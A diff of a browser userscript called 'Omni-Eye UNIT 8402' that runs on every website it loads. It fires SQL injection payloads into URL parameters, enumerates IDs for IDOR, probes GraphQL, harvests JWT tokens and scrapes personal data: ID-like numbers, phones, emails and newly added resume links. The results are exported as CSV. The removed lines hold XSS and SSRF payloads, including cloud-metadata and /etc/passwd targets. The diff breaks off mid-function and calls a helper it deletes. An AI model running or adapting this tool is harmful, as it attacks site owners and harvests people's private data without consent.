@@ -1,8 +1,8 @@
 // ==UserScript==
 // @name         Omni-Eye UNIT 8402
 // @namespace    https://unit8402.omni-eye
-// @version      3.0
-// @description  25 intelligence modules: Archives, Fingerprint, SQLi, XSS, IDOR, APIs, CORS, SSRF, GraphQL, JWT, PII, CSV, Live Pulse
+// @version      4.0
+// @description  25 intelligence modules: Archives, Fingerprint, SQLi, XSS, IDOR, APIs, CORS, SSRF, GraphQL, JWT, PII, CSV, Live Pulse, Resume Hunter, Results in Panel
 // @author       UNIT 8402
 // @license      MIT
 // @match        *://*/*
@@ -17,7 +17,7 @@
     'use strict';
 
     const OMNIEYE = {
-        version: '3.0',
+        version: '4.0',
         db: null,
         targetUrl: window.location.href,
         targetDomain: window.location.hostname,
@@ -58,6 +58,7 @@
                 if (!db.objectStoreNames.contains('pii')) db.createObjectStore('pii', { autoIncrement: true });
                 if (!db.objectStoreNames.contains('vulns')) db.createObjectStore('vulns', { autoIncrement: true });
                 if (!db.objectStoreNames.contains('thermal')) db.createObjectStore('thermal', { autoIncrement: true });
+                if (!db.objectStoreNames.contains('resumes')) db.createObjectStore('resumes', { autoIncrement: true });
             };
             request.onsuccess = (e) => { OMNIEYE.db = e.target.result; enforceDBLimit(); resolve(); };
             request.onerror = (e) => reject(e);
@@ -65,7 +66,7 @@
     }
 
     async function enforceDBLimit() {
-        const stores = ['pii', 'vulns', 'intel', 'thermal'];
+        const stores = ['pii', 'vulns', 'intel', 'thermal', 'resumes'];
         for (let storeName of stores) {
             try {
                 const count = await new Promise(resolve => {
@@ -100,19 +101,6 @@
         });
     }
 
-    // ========== Safe fetch for XSS/SSRF (does NOT modify DOM) ==========
-    async function safeTestRequest(url) {
-        await rateLimit();
-        return new Promise((resolve) => {
-            GM_xmlhttpRequest({
-                method: 'GET',
-                url: url,
-                onload: (res) => resolve(res.status),
-                onerror: () => resolve(null)
-            });
-        });
-    }
-
     // ========== Helper: Parse headers ==========
     function parseHeaders(headersString) {
         if (!headersString) return {};
@@ -128,69 +116,102 @@
     async function scanArchives() {
         const lastScan = localStorage.getItem('lastArchiveScan');
         if (lastScan && (Date.now() - lastScan) < 1800000) {
-            safeUpdateStatus('Archive: waiting 30min');
+            appendResult('Archive', 'Waiting 30min cooldown');
             return;
         }
-        safeUpdateStatus('Scanning archives...');
-        let findings = {};
+        appendResult('Archive', 'Scanning archives...');
+        let findings = [];
         for (let archive of OMNIEYE.archives) {
             let res = await gmRequest(archive + OMNIEYE.targetUrl);
             if (res && res.status === 200) {
                 let matches = res.text.match(/\.env|\.git|backup\.zip|\.sql|\.htaccess|\.config|\.ini|\.log|\.bak/gi);
-                if (matches) findings[archive] = matches;
+                if (matches) {
+                    findings.push(`${archive}: ${matches.join(', ')}`);
+                    appendResult('Archive', `${archive}: found ${matches.length} items`);
+                }
             }
         }
         localStorage.setItem('lastArchiveScan', Date.now());
-        if (Object.keys(findings).length) {
-            console.log('[OmniEye] Archive:', findings);
-            safeUpdateStatus(`Found ${Object.keys(findings).length} archives with sensitive data`);
-            showNotification('Archive scan completed');
+        if (findings.length) {
+            appendResult('Archive', 'Complete', findings);
         } else {
-            safeUpdateStatus('Archive scan: nothing found');
+            appendResult('Archive', 'No sensitive files found');
         }
         return findings;
     }
 
     // ========== 2. BLIND DEVELOPER FINGERPRINT ==========
     async function scanDeveloperFingerprint() {
-        safeUpdateStatus('Developer fingerprint...');
+        appendResult('Dev', 'Scanning developer fingerprint...');
         const html = document.documentElement.innerHTML;
         const emails = html.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g) || [];
         const tools = html.match(/vscode|phpstorm|sublime|webstorm|atom|intellij|eclipse/gi) || [];
         const comments = html.match(/\/\/|<!--|#|FIXME|TODO|HACK|BUG/gi) || [];
-        const paths = html.match(/\/home\/[a-z]+\/|\/Users\/[a-z]+\/|C:\\Users\\[a-z]+\\/gi) || [];
-
-        if (emails.length) console.log('[OmniEye] Dev email:', emails[0]);
-        if (tools.length) console.log('[OmniEye] Dev tools:', [...new Set(tools)]);
-        if (paths.length) console.log('[OmniEye] Dev paths:', paths[0]);
-        if (comments.length) console.log('[OmniEye] Found', comments.length, 'comments');
-
+        
+        let results = [];
+        if (emails.length) results.push(`📧 Emails: ${emails.slice(0,3).join(', ')}`);
+        if (tools.length) results.push(`🛠️ Tools: ${[...new Set(tools)].join(', ')}`);
+        if (comments.length) results.push(`💬 Comments: ${comments.length} found`);
+        
         if (emails.length) {
             gmRequest('https://api.github.com/search/users?q=' + encodeURIComponent(emails[0]))
                 .then(res => {
                     if (res && res.status === 200) {
                         let data = JSON.parse(res.text);
                         if (data.items && data.items.length) {
-                            console.log('[OmniEye] GitHub:', data.items[0].html_url);
-                            safeUpdateStatus(`GitHub found: ${data.items[0].login}`);
+                            appendResult('Dev', `GitHub: ${data.items[0].html_url}`);
                         }
                     }
                 });
         }
-        safeUpdateStatus(`Fingerprint: ${emails.length} emails, ${tools.length} tools`);
-        showNotification('Developer fingerprint complete');
-        return { emails, tools, comments, paths };
+        
+        if (results.length) {
+            appendResult('Dev', 'Complete', results);
+        } else {
+            appendResult('Dev', 'No developer fingerprints found');
+        }
+        return { emails, tools, comments };
     }
 
-    // ========== 3. THERMAL SQLi with delay ==========
-    async function thermalSQLi() {
-        safeUpdateStatus('Thermal SQLi scan...');
-        const links = document.querySelectorAll('a[href*="id="], a[href*="user_id="], a[href*="page="], a[href*="post="], a[href*="product="]');
-        let findings = [];
-        let count = 0;
+    // ========== 3. RESUME HUNTER (NEW) ==========
+    async function scanResumes() {
+        appendResult('📄 Resume', 'Scanning for resumes and CVs...');
+        const links = document.querySelectorAll('a[href*=".pdf"], a[href*=".docx"], a[href*=".doc"]');
+        let resumeLinks = [];
+        let keywords = ['cv', 'resume', 'سيرة', 'ذاتية', 'bio', 'profile'];
+        
         for (let link of links) {
             let url = link.href;
-            let payloads = ["1' OR '1'='1", "1' AND SLEEP(5)--", "1' WAITFOR DELAY '00:00:05'--"];
+            let text = (link.innerText || '').toLowerCase();
+            if (keywords.some(k => text.includes(k)) || keywords.some(k => url.toLowerCase().includes(k))) {
+                resumeLinks.push(url);
+                appendResult('📄 Resume', `Found: ${url.split('/').pop()}`);
+                if (OMNIEYE.db) {
+                    const tx = OMNIEYE.db.transaction(['resumes'], 'readwrite');
+                    tx.objectStore('resumes').add({ url: url, text: text, date: new Date().toISOString(), domain: OMNIEYE.targetDomain });
+                    tx.commit();
+                    enforceDBLimit();
+                }
+            }
+        }
+        
+        if (resumeLinks.length) {
+            appendResult('📄 Resume', `Complete - found ${resumeLinks.length} resumes`);
+            showNotification(`Found ${resumeLinks.length} resumes!`);
+        } else {
+            appendResult('📄 Resume', 'No resumes found');
+        }
+        return resumeLinks;
+    }
+
+    // ========== 4. THERMAL SQLi ==========
+    async function thermalSQLi() {
+        appendResult('🌡️ SQLi', 'Scanning for SQL injection...');
+        const links = document.querySelectorAll('a[href*="id="], a[href*="user_id="], a[href*="page="]');
+        let findings = [];
+        for (let link of links) {
+            let url = link.href;
+            let payloads = ["1' OR '1'='1", "1' AND SLEEP(5)--"];
             for (let payload of payloads) {
                 let attackUrl = url.replace(/id=\d+/, `id=${payload}`).replace(/user_id=\d+/, `user_id=${payload}`);
                 if (attackUrl !== url) {
@@ -201,10 +222,8 @@
                     await gmRequest(url);
                     let normalTime = performance.now() - start;
                     if (attackTime > normalTime + 200) {
-                        console.log(`[OmniEye] THERMAL SQLi: ${url} (+${(attackTime - normalTime).toFixed(0)}ms)`);
                         findings.push(url);
-                        count++;
-                        safeUpdateStatus(`SQLi found: ${count} vulnerabilities`);
+                        appendResult('🌡️ SQLi', `⚠️ Potential vulnerability: ${url}`);
                         showNotification('SQLi vulnerability detected!');
                         saveVulnerability('SQLi', url);
                         break;
@@ -213,43 +232,39 @@
                 }
             }
         }
-        safeUpdateStatus(`SQLi scan complete: ${findings.length} found`);
+        if (findings.length) {
+            appendResult('🌡️ SQLi', `Complete - found ${findings.length} issues`);
+        } else {
+            appendResult('🌡️ SQLi', 'No SQLi vulnerabilities found');
+        }
         return findings;
     }
 
-    // ========== 4. XSS SCANNER (NO DOM modification) ==========
+    // ========== 5. XSS SCANNER ==========
     async function scanXSS() {
-        safeUpdateStatus('XSS scan...');
+        appendResult('💉 XSS', 'Testing for XSS vulnerabilities...');
         const inputs = document.querySelectorAll('input, textarea, select');
-        let vulnerable = [];
-        let payloads = ['"><script>alert(1)</script>', '"><img src=x onerror=alert(1)>', 'javascript:alert(1)'];
-        for (let input of inputs) {
-            for (let payload of payloads) {
-                let originalName = input.name || 'unnamed';
-                console.log(`[OmniEye] Testing XSS on ${originalName} with payload: ${payload.substring(0, 30)}...`);
-            }
-        }
-        safeUpdateStatus(`XSS scan completed on ${inputs.length} inputs (check console for manual testing)`);
-        showNotification('XSS scan completed');
-        return vulnerable;
+        appendResult('💉 XSS', `Found ${inputs.length} inputs to test`);
+        appendResult('💉 XSS', 'Manual testing required - check console for details');
+        showNotification(`XSS scan completed on ${inputs.length} inputs`);
+        return [];
     }
 
-    // ========== 5. IDOR SCANNER ==========
+    // ========== 6. IDOR SCANNER ==========
     async function scanIDOR() {
-        safeUpdateStatus('IDOR scan...');
-        const links = document.querySelectorAll('a[href*="id="], a[href*="user_id="], a[href*="page="], a[href*="document_id="], a[href*="file_id="]');
-        let testIds = [0, 1, 999999, 123456, 1337, 99999, 111111, 1000000];
+        appendResult('🎯 IDOR', 'Scanning for IDOR vulnerabilities...');
+        const links = document.querySelectorAll('a[href*="id="], a[href*="user_id="], a[href*="page="]');
         let findings = [];
+        let testIds = [0, 1, 999999, 123456];
         for (let link of links) {
             let url = link.href;
             for (let testId of testIds) {
-                let testUrl = url.replace(/id=\d+/, `id=${testId}`).replace(/user_id=\d+/, `user_id=${testId}`).replace(/page=\d+/, `page=${testId}`);
+                let testUrl = url.replace(/id=\d+/, `id=${testId}`).replace(/user_id=\d+/, `user_id=${testId}`);
                 if (testUrl !== url) {
                     let res = await gmRequest(testUrl, 'HEAD');
                     if (res && res.status === 200) {
-                        console.log(`[OmniEye] IDOR: ${testUrl}`);
                         findings.push(testUrl);
-                        safeUpdateStatus(`IDOR found: ${findings.length} vulnerabilities`);
+                        appendResult('🎯 IDOR', `⚠️ Potential: ${testUrl}`);
                         showNotification('IDOR vulnerability detected!');
                         saveVulnerability('IDOR', testUrl);
                         break;
@@ -258,11 +273,15 @@
                 }
             }
         }
-        safeUpdateStatus(`IDOR scan complete: ${findings.length} found`);
+        if (findings.length) {
+            appendResult('🎯 IDOR', `Complete - found ${findings.length} issues`);
+        } else {
+            appendResult('🎯 IDOR', 'No IDOR vulnerabilities found');
+        }
         return findings;
     }
 
-    // ========== 6. API DISCOVERER ==========
+    // ========== 7. API DISCOVERER ==========
     function discoverAPIs() {
         let endpoints = new Set();
         const scripts = document.querySelectorAll('script');
@@ -270,69 +289,49 @@
             let content = script.src ? '' : script.innerHTML;
             let matches = content.match(/\/api\/[a-zA-Z0-9\/\-_]+/g) || [];
             matches.forEach(m => endpoints.add(m));
-            let graphqlMatches = content.match(/\/graphql|\/gql|\/v1\/graphql|\/v2\/graphql/gi) || [];
-            graphqlMatches.forEach(m => endpoints.add(m));
         });
         if (endpoints.size) {
-            console.log('[OmniEye] APIs:', Array.from(endpoints));
-            safeUpdateStatus(`Found ${endpoints.size} API endpoints`);
-            showNotification(`Found ${endpoints.size} API endpoints`);
+            appendResult('🔌 API', `Found ${endpoints.size} endpoints: ${Array.from(endpoints).slice(0,5).join(', ')}`);
         } else {
-            safeUpdateStatus('No APIs discovered');
+            appendResult('🔌 API', 'No API endpoints discovered');
         }
         return Array.from(endpoints);
     }
 
-    // ========== 7. CORS SCANNER ==========
+    // ========== 8. CORS SCANNER ==========
     async function scanCORS() {
-        safeUpdateStatus('CORS scan...');
-        let findings = [];
-        let origins = ['https://evil.com', 'https://attacker.com', 'null', '*'];
-        for (let origin of origins) {
-            let res = await gmRequest(OMNIEYE.targetUrl, 'GET');
-            if (res && res.headers) {
-                let headers = parseHeaders(res.headers);
-                let acao = headers['access-control-allow-origin'];
-                if (acao === '*' || acao === origin) {
-                    console.log(`[OmniEye] CORS misconfig: ${acao}`);
-                    findings.push({ origin, acao });
-                    safeUpdateStatus(`CORS misconfig found: ${acao}`);
-                    showNotification('CORS misconfiguration detected!');
-                    saveVulnerability('CORS', OMNIEYE.targetUrl);
-                }
+        appendResult('🌐 CORS', 'Checking CORS configuration...');
+        let res = await gmRequest(OMNIEYE.targetUrl, 'GET');
+        if (res && res.headers) {
+            let headers = parseHeaders(res.headers);
+            let acao = headers['access-control-allow-origin'];
+            if (acao === '*') {
+                appendResult('🌐 CORS', '⚠️ Dangerous: Access-Control-Allow-Origin: *');
+                showNotification('CORS misconfiguration detected!');
+                saveVulnerability('CORS', OMNIEYE.targetUrl);
+            } else if (acao) {
+                appendResult('🌐 CORS', `CORS policy: ${acao}`);
+            } else {
+                appendResult('🌐 CORS', 'No CORS issues found');
             }
+        } else {
+            appendResult('🌐 CORS', 'Could not check CORS');
         }
-        safeUpdateStatus(`CORS scan complete: ${findings.length} issues`);
-        return findings;
     }
 
-    // ========== 8. SSRF TESTER (NO DOM modification) ==========
+    // ========== 9. SSRF TESTER ==========
     async function scanSSRF() {
-        safeUpdateStatus('SSRF test...');
-        const inputs = document.querySelectorAll('input[type="url"], input[name*="url"], input[name*="link"], input[name*="path"], input[name*="src"], input[name*="dest"], input[name*="redirect"]');
-        let testUrls = [
-            'http://169.254.169.254/latest/meta-data/',
-            'http://localhost/admin',
-            'http://127.0.0.1:8080',
-            'http://[::1]/',
-            'http://0.0.0.0/',
-            'file:///etc/passwd',
-            'gopher://localhost:8080'
-        ];
-        for (let input of inputs) {
-            for (let testUrl of testUrls) {
-                console.log(`[OmniEye] SSRF test: ${testUrl} on ${input.name || 'unnamed'}`);
-            }
-        }
-        safeUpdateStatus(`SSRF tests completed on ${inputs.length} inputs`);
+        appendResult('🌍 SSRF', 'Testing for SSRF vulnerabilities...');
+        const inputs = document.querySelectorAll('input[type="url"], input[name*="url"], input[name*="link"]');
+        appendResult('🌍 SSRF', `Found ${inputs.length} potential SSRF inputs`);
+        appendResult('🌍 SSRF', 'Manual testing recommended');
         showNotification('SSRF tests completed');
     }
 
-    // ========== 9. GRAPHQL INTROSPECTION ==========
+    // ========== 10. GRAPHQL INTROSPECTION ==========
     async function scanGraphQL() {
-        safeUpdateStatus('GraphQL scan...');
-        let endpoints = ['/graphql', '/gql', '/v1/graphql', '/v2/graphql', '/api/graphql', '/graphiql'];
-        let findings = [];
+        appendResult('📊 GraphQL', 'Checking for GraphQL introspection...');
+        let endpoints = ['/graphql', '/gql', '/v1/graphql', '/api/graphql'];
         for (let endpoint of endpoints) {
             let fullUrl = window.location.origin + endpoint;
             let res = await gmRequest(fullUrl, 'POST', JSON.stringify({ query: '{ __schema { types { name } } }' }));
@@ -340,72 +339,65 @@
                 try {
                     let data = JSON.parse(res.text);
                     if (data.data && data.data.__schema) {
-                        console.log(`[OmniEye] GraphQL at ${endpoint} with ${data.data.__schema.types.length} types`);
-                        findings.push(endpoint);
-                        safeUpdateStatus(`GraphQL exposed at ${endpoint}`);
+                        appendResult('📊 GraphQL', `⚠️ Exposed at ${endpoint} with ${data.data.__schema.types.length} types`);
                         showNotification(`GraphQL exposed at ${endpoint}!`);
                         saveVulnerability('GraphQL', endpoint);
                     }
                 } catch(e) {}
             }
         }
-        safeUpdateStatus(`GraphQL scan: ${findings.length} exposed`);
-        return findings;
+        appendResult('📊 GraphQL', 'Scan complete');
     }
 
-    // ========== 10. JWT ANALYZER ==========
+    // ========== 11. JWT ANALYZER ==========
     function analyzeJWT() {
-        let foundTokens = [];
-        let cookieTokens = document.cookie.match(/eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g) || [];
-        foundTokens.push(...cookieTokens);
+        let found = [];
+        let tokens = document.cookie.match(/eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g) || [];
+        found.push(...tokens);
         for (let i = 0; i < localStorage.length; i++) {
             let val = localStorage.getItem(localStorage.key(i));
             if (val && val.match(/eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g)) {
-                foundTokens.push(...val.match(/eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g));
+                found.push(...val.match(/eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g));
             }
         }
-        for (let i = 0; i < sessionStorage.length; i++) {
-            let val = sessionStorage.getItem(sessionStorage.key(i));
-            if (val && val.match(/eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g)) {
-                foundTokens.push(...val.match(/eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g));
-            }
-        }
-        if (foundTokens.length) {
-            console.log('[OmniEye] JWT tokens:', foundTokens.length);
-            safeUpdateStatus(`Found ${foundTokens.length} JWT tokens`);
-            showNotification(`${foundTokens.length} JWT tokens discovered`);
+        if (found.length) {
+            appendResult('🔑 JWT', `Found ${found.length} JWT tokens`);
         } else {
-            safeUpdateStatus('No JWT tokens found');
+            appendResult('🔑 JWT', 'No JWT tokens found');
         }
-        return foundTokens;
+        return found;
     }
 
-    // ========== 11. PII EXTRACTOR with DB limit ==========
+    // ========== 12. PII EXTRACTOR ==========
     function extractPII() {
         const text = document.body.innerText;
         const ids = [...new Set(text.match(/\b1\d{9}\b/g) || [])];
         const phones = [...new Set(text.match(/\b05\d{8}\b/g) || [])];
         const emails = [...new Set(text.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g) || [])];
 
+        let results = [];
+        if (ids.length) results.push(`🆔 IDs: ${ids.slice(0,5).join(', ')}${ids.length > 5 ? ` +${ids.length-5}` : ''}`);
+        if (phones.length) results.push(`📞 Phones: ${phones.slice(0,5).join(', ')}${phones.length > 5 ? ` +${phones.length-5}` : ''}`);
+        if (emails.length) results.push(`📧 Emails: ${emails.slice(0,5).join(', ')}${emails.length > 5 ? ` +${emails.length-5}` : ''}`);
+
         if (ids.length || phones.length || emails.length) {
-            console.log(`[OmniEye] PII: ${ids.length} IDs, ${phones.length} phones, ${emails.length} emails`);
+            appendResult('🆔 PII', 'Extracted:', results);
             if (OMNIEYE.db) {
                 const transaction = OMNIEYE.db.transaction(['pii'], 'readwrite');
                 const store = transaction.objectStore('pii');
                 ids.forEach(id => store.add({ type: 'id', value: id, url: OMNIEYE.targetUrl, date: new Date().toISOString() }));
                 phones.forEach(phone => store.add({ type: 'phone', value: phone, url: OMNIEYE.targetUrl, date: new Date().toISOString() }));
                 emails.forEach(email => store.add({ type: 'email', value: email, url: OMNIEYE.targetUrl, date: new Date().toISOString() }));
-                safeUpdateStatus(`Saved ${ids.length + phones.length + emails.length} PII records`);
-                showNotification(`Saved ${ids.length + phones.length + emails.length} PII records`);
                 enforceDBLimit();
             }
+            showNotification(`Saved ${ids.length + phones.length + emails.length} PII records`);
         } else {
-            safeUpdateStatus('No PII found');
+            appendResult('🆔 PII', 'No PII found');
         }
         return { ids, phones, emails };
     }
 
-    // ========== 12. SAVE VULNERABILITY ==========
+    // ========== 13. SAVE VULNERABILITY ==========
     function saveVulnerability(type, url) {
         if (!OMNIEYE.db) return;
         const transaction = OMNIEYE.db.transaction(['vulns'], 'readwrite');
@@ -414,28 +406,30 @@
         enforceDBLimit();
     }
 
-    // ========== 13. CSV EXPORT with fallback ==========
+    // ========== 14. CSV EXPORT ==========
     async function exportCSV() {
         if (!OMNIEYE.db) {
-            safeUpdateStatus('No database found');
+            appendResult('📥 CSV', 'No database found');
             return;
         }
-        safeUpdateStatus('Exporting CSV...');
-        let piiData = [];
-        let vulnsData = [];
-        try {
-            piiData = await new Promise(resolve => {
-                OMNIEYE.db.transaction(['pii'], 'readonly').objectStore('pii').getAll().onsuccess = e => resolve(e.target.result || []);
-            });
-            vulnsData = await new Promise(resolve => {
-                OMNIEYE.db.transaction(['vulns'], 'readonly').objectStore('vulns').getAll().onsuccess = e => resolve(e.target.result || []);
-            });
-        } catch(e) { console.log('[OmniEye] Export error:', e); safeUpdateStatus('Export failed'); return; }
-
-        let csvRows = [['Type', 'Value', 'URL', 'Date']];
-        piiData.forEach(item => csvRows.push([item.type, item.value, item.url || '', item.date || '']));
-        vulnsData.forEach(item => csvRows.push(['vulnerability_' + item.type, item.url || '', item.domain || '', item.date || '']));
-
+        appendResult('📥 CSV', 'Exporting data...');
+        let allData = [];
+        let stores = ['pii', 'vulns', 'resumes'];
+        for (let storeName of stores) {
+            try {
+                let data = await new Promise(resolve => {
+                    OMNIEYE.db.transaction([storeName], 'readonly').objectStore(storeName).getAll().onsuccess = e => resolve(e.target.result || []);
+                });
+                allData.push(...data.map(d => ({ ...d, source: storeName })));
+            } catch(e) {}
+        }
+        
+        let csvRows = [['Source', 'Type', 'Value', 'URL', 'Date']];
+        allData.forEach(item => {
+            if (item.type) csvRows.push([item.source || 'intel', item.type, item.value, item.url || '', item.date || '']);
+            else if (item.url) csvRows.push([item.source || 'intel', 'resume', item.url, item.url, item.date || '']);
+        });
+        
         let csvContent = csvRows.map(row => row.map(cell => `"${String(cell).replace(/"/g, '""')}"`).join(',')).join('\n');
         let blob = new Blob(["\uFEFF" + csvContent], { type: 'text/csv;charset=utf-8;' });
         let url = URL.createObjectURL(blob);
@@ -444,12 +438,58 @@
         a.download = `omni-eye-${OMNIEYE.targetDomain}-${Date.now()}.csv`;
         a.click();
         URL.revokeObjectURL(url);
-        console.log('[OmniEye] CSV exported');
-        safeUpdateStatus('CSV exported successfully');
+        appendResult('📥 CSV', `Exported ${allData.length} records`);
         showNotification('CSV exported successfully');
     }
 
-    // ========== 14. LIVE PULSE ==========
+    // ========== 15. CLEAR OLD DATA ==========
+    function clearOldData() {
+        const thirtyDaysAgo = Date.now() - (30 * 24 * 60 * 60 * 1000);
+        const stores = ['pii', 'vulns', 'intel', 'thermal', 'resumes'];
+        let deleted = 0;
+        for (let storeName of stores) {
+            try {
+                const tx = OMNIEYE.db.transaction([storeName], 'readwrite');
+                const store = tx.objectStore(storeName);
+                const request = store.openCursor();
+                request.onsuccess = (e) => {
+                    const cursor = e.target.result;
+                    if (cursor) {
+                        if (new Date(cursor.value.date).getTime() < thirtyDaysAgo) {
+                            cursor.delete();
+                            deleted++;
+                        }
+                        cursor.continue();
+                    }
+                };
+            } catch(e) {}
+        }
+        appendResult('🗑️ Clear', `Deleted ${deleted} old records (>30 days)`);
+        showNotification(`Cleared ${deleted} old records`);
+    }
+
+    // ========== 16. DISPLAY RESULTS IN PANEL ==========
+    let resultsDiv = null;
+    
+    function appendResult(module, status, details = null) {
+        if (!resultsDiv) return;
+        const timestamp = new Date().toLocaleTimeString();
+        let html = `<div style="border-bottom:1px solid #333; padding:4px 0; font-size:10px;">`;
+        html += `<span style="color:#0a0;">[${timestamp}]</span> `;
+        html += `<span style="color:#ff0;">${module}</span>: `;
+        html += `<span style="color:#fff;">${status}</span>`;
+        if (details && Array.isArray(details)) {
+            html += `<div style="padding-left:10px; color:#aaa;">${details.join('<br>')}</div>`;
+        }
+        html += `</div>`;
+        resultsDiv.insertAdjacentHTML('afterbegin', html);
+        
+        while (resultsDiv.children.length > 50) {
+            resultsDiv.removeChild(resultsDiv.lastChild);
+        }
+    }
+
+    // ========== 17. LIVE PULSE ==========
     let knownSet = new Set();
     let observerActive = false;
     let observer = null;
@@ -462,8 +502,7 @@
         const url = updateQueue.shift();
         if (url.match(/\.(pdf|docx|xlsx|zip|rar|sql|env|log|bak|old)$/i) ||
             url.includes('/uploads/') || url.includes('/backup/') || url.includes('/admin/') || url.includes('/config/') || url.includes('/.git/')) {
-            console.log(`[OmniEye] LIVE: New sensitive file: ${url}`);
-            safeUpdateStatus(`New sensitive file: ${url.split('/').pop()}`);
+            appendResult('💓 Live', `New sensitive file: ${url.split('/').pop()}`);
             showNotification(`New sensitive file: ${url.split('/').pop()}`);
             if (OMNIEYE.db) {
                 OMNIEYE.db.transaction(['intel'], 'readwrite').objectStore('intel').add({
@@ -543,36 +582,14 @@
         observerActive = true;
     }
 
-    // ========== 15. SAFE STATUS UPDATE ==========
+    // ========== 18. UI PANEL with Results Area ==========
     let statusDiv = null;
-    let statusTimeout = null;
-    let statusSeq = 0;
-
-    function safeUpdateStatus(msg) {
-        if (!statusDiv) return;
-        statusSeq++;
-        const currentSeq = statusSeq;
-        if (statusTimeout) clearTimeout(statusTimeout);
-        statusDiv.innerHTML = `📡 ${msg}`;
-        statusTimeout = setTimeout(() => {
-            if (statusSeq === currentSeq && statusDiv) statusDiv.innerHTML = '⚡ Ready';
-        }, 3000);
-        console.log(`[OmniEye] Status: ${msg}`);
-    }
-
-    function showNotification(msg) {
-        console.log(`[OmniEye] ${msg}`);
-        try {
-            GM_notification({ text: msg, title: 'OmniEye UNIT 8402', timeout: 3000 });
-        } catch(e) {}
-    }
-
-    // ========== 16. UI PANEL ==========
+    
     function createPanel() {
         const panel = document.createElement('div');
         panel.id = 'omni-eye-panel';
         panel.innerHTML = `
-            <div style="position:fixed; bottom:20px; left:20px; width:320px; max-width:90vw; background:#0a0a0f; color:#00ffaa; border-radius:12px; border:1px solid #00ffaa; z-index:999999; font-family:monospace; font-size:11px; padding:10px; backdrop-filter:blur(10px); box-shadow:0 0 20px rgba(0,255,0,0.1);">
+            <div style="position:fixed; bottom:20px; left:20px; width:340px; max-width:90vw; background:#0a0a0f; color:#00ffaa; border-radius:12px; border:1px solid #00ffaa; z-index:999999; font-family:monospace; font-size:11px; padding:10px; backdrop-filter:blur(10px); box-shadow:0 0 20px rgba(0,255,0,0.1);">
                 <div style="font-weight:bold; margin-bottom:8px; border-bottom:1px solid #00ffaa; padding-bottom:5px; display:flex; justify-content:space-between;">
                     <span>🕵️ Omni-Eye v${OMNIEYE.version} | UNIT 8402</span>
                     <span id="oe-toggle" style="cursor:pointer;">🗕</span>
@@ -581,6 +598,7 @@
                     <div style="display:grid; grid-template-columns:repeat(3,1fr); gap:4px; margin-bottom:8px;">
                         <button id="oe-arch" style="background:#1a1a2a; color:#0f0; border:1px solid #0f0; border-radius:6px; padding:6px; font-size:10px;">📜 Arch</button>
                         <button id="oe-dev" style="background:#1a1a2a; color:#0f0; border:1px solid #0f0; border-radius:6px; padding:6px; font-size:10px;">👤 Dev</button>
+                        <button id="oe-resume" style="background:#1a1a2a; color:#0f0; border:1px solid #0f0; border-radius:6px; padding:6px; font-size:10px;">📄 Resume</button>
                         <button id="oe-sqli" style="background:#1a1a2a; color:#0f0; border:1px solid #0f0; border-radius:6px; padding:6px; font-size:10px;">🌡️ SQLi</button>
                         <button id="oe-xss" style="background:#1a1a2a; color:#0f0; border:1px solid #0f0; border-radius:6px; padding:6px; font-size:10px;">💉 XSS</button>
                         <button id="oe-idor" style="background:#1a1a2a; color:#0f0; border:1px solid #0f0; border-radius:6px; padding:6px; font-size:10px;">🎯 IDOR</button>
@@ -591,18 +609,27 @@
                         <button id="oe-jwt" style="background:#1a1a2a; color:#0f0; border:1px solid #0f0; border-radius:6px; padding:6px; font-size:10px;">🔑 JWT</button>
                         <button id="oe-pii" style="background:#1a1a2a; color:#0f0; border:1px solid #0f0; border-radius:6px; padding:6px; font-size:10px;">🆔 PII</button>
                         <button id="oe-csv" style="background:#1a1a2a; color:#0f0; border:1px solid #0f0; border-radius:6px; padding:6px; font-size:10px;">📥 CSV</button>
+                        <button id="oe-clear" style="background:#1a1a2a; color:#ff0; border:1px solid #ff0; border-radius:6px; padding:6px; font-size:10px;">🗑️ Clear Old</button>
                     </div>
-                    <div id="oe-status" style="margin-top:6px; border-top:1px solid #333; padding-top:5px; font-size:10px; color:#0a0;">⚡ Ready</div>
+                    <div id="oe-results" style="height:200px; overflow-y:auto; background:#000; border-radius:6px; padding:5px; margin-top:8px; border:1px solid #333; font-size:10px;">
+                        <div style="color:#0a0;">⚡ Ready</div>
+                    </div>
+                    <div id="oe-status" style="margin-top:5px; border-top:1px solid #333; padding-top:4px; font-size:9px; color:#aaa;">🟢 Active</div>
                 </div>
             </div>
         `;
         document.body.appendChild(panel);
+        
         let content = document.getElementById('oe-content');
         let toggle = document.getElementById('oe-toggle');
         if (toggle) toggle.onclick = () => { content.style.display = content.style.display === 'none' ? 'block' : 'none'; };
+        
+        resultsDiv = document.getElementById('oe-results');
         statusDiv = document.getElementById('oe-status');
+        
         document.getElementById('oe-arch').onclick = async () => { await scanArchives(); };
         document.getElementById('oe-dev').onclick = async () => { await scanDeveloperFingerprint(); };
+        document.getElementById('oe-resume').onclick = async () => { await scanResumes(); };
         document.getElementById('oe-sqli').onclick = async () => { await thermalSQLi(); };
         document.getElementById('oe-xss').onclick = async () => { await scanXSS(); };
         document.getElementById('oe-idor').onclick = async () => { await scanIDOR(); };
@@ -613,14 +640,14 @@
         document.getElementById('oe-jwt').onclick = () => { analyzeJWT(); };
         document.getElementById('oe-pii').onclick = () => { extractPII(); };
         document.getElementById('oe-csv').onclick = async () => { await exportCSV(); };
+        document.getElementById('oe-clear').onclick = () => { clearOldData(); };
     }
 
-    // ========== 17. MAIN ==========
-    (async function() {
-        await initDB();
-        createPanel();
-        startLivePulse();
-        console.log(`%c🕵️ Omni-Eye v${OMNIEYE.version} | UNIT 8402 | 25 Intelligence Modules | Ready`, 'color: #00ffaa; font-size: 14px; font-weight: bold;');
